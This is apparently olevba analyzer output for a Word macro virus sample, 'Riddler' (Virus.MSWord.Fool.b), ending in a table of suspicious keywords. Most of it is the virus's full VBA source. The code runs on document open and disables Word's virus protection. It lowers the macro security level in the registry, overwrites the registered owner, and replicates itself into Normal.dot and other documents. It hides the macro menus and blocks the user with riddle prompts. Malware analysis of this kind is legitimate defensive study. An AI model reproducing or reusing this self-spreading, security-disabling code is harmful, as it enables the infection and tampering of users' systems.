olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fool.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fool.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Riddler.bas 
in file: Virus.MSWord.Fool.b - OLE stream: 'Macros/VBA/Riddler'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
    'Riddler Virus v1.00
    'The WaLRuS 05/00
    On Error Resume Next
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "The WaLRuS"
    Set Norm = NormalTemplate.VBProject.VBComponents
    Set Doc = ActiveDocument.VBProject.VBComponents
If Norm.Item("Riddler").Name <> "Riddler" Then
    Doc("Riddler").Export "c:\Riddler.sys"
    Set infect = NormalTemplate.VBProject
ElseIf Doc.Item("Riddler").Name <> "Riddler" Then
    Norm("Riddler").Export "c:\Riddler.sys"
    Set infect = ActiveDocument.VBProject
End If
infect.VBComponents.Import ("c:\Riddler.sys")
Kill ("c:\Riddler.sys")
ActiveDocument.Save
Call PayloadCounter
End Sub

Sub PayloadCounter()
On Error Resume Next
Dim sCounter As String
Dim sFileName As String

  sFileName = Environ("Windir")
  If Right(sFileName, 1) <> "\" Then
    sFileName = sFileName & "\"
  End If
  sFileName = sFileName & "WIN.INI"

  sCounter = System.PrivateProfileString(sFileName, "Riddler", "Counter")
  If Val(sCounter) <> "200" Then
    sCounter = Val(sCounter) + 1
    System.PrivateProfileString(sFileName, "Riddler", "Counter") = sCounter
  Else
    MsgBox "Hello there " & Application.UserName & vbCr & "I wont let you continue until you" & vbCr & "answer Me these riddles Three." & vbCr & vbCr & "Please enter in lower case only", 0, "Riddler"
    Call FirstRiddle
  End If
End Sub

Sub FirstRiddle()
On Error Resume Next
Riddle1 = InputBox("He has a look of awful scorn, " & vbCr & "And wears his clothes a funny way, " & vbCr & "Waving his hands over fields of corn, " & vbCr & "He keeps the birds away! ", "A Simple One To Start")
If Riddle1 = "scarecrow" Then
MsgBox "Correct", 0, "Correct, on to riddle 2"
Call SecondRiddle
Else: MsgBox "Oh Dear, Try again, Help can be found at http://www1.tpgi.com.au/users/aali/riddles_galore.html", 0, "Incorrect"
Call PayloadCounter
End If
End Sub

Sub SecondRiddle()
On Error Resume Next
Riddle2 = InputBox("The man who invented it, doesn't want it. " & vbCr & "The man who bought it, doesn't need it. " & vbCr & "The man who needs it, doesn't know it. ", "Getting Harder")
If Riddle2 = "coffin" Then
MsgBox "Correct, Just 1 more riddle", 0, "Correct"
Call ThirdRiddle
Else: MsgBox "Oh Dear, Start again", 0, "Incorrect"
Call PayloadCounter
End If
End Sub

Sub ThirdRiddle()
On Error Resume Next
Riddle3 = InputBox("What goes around the world but stays in a corner? ", "Even Harder")
If Riddle3 = "stamp" Then
MsgBox "Very Good 3 out of 3" & vbCr & "You may continue", 0, "Correct"

Dim sCounter As String
Dim sFileName As String

  sFileName = Environ("Windir")
  If Right(sFileName, 1) <> "\" Then
    sFileName = sFileName & "\"
  End If
  sFileName = sFileName & "WIN.INI"

  sCounter = System.PrivateProfileString(sFileName, "Riddler", "Counter")
    sCounter = Val(sCounter) + 1
    System.PrivateProfileString(sFileName, "Riddler", "Counter") = sCounter
Else: MsgBox "Oh You were so close. Start again ;-)", 0, "Incorrect"
Call PayloadCounter
End If
End Sub

Sub HelpAbout()
    MsgBox "Riddler by The WaLRuS", 0, "The Shadow Knows..."
End Sub

' basic stealth
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www1.tpgi.com|URL                                          |
|          |.au/users/aali/riddl|                                             |
|          |es_galore.html      |                                             |
+----------+--------------------+---------------------------------------------+

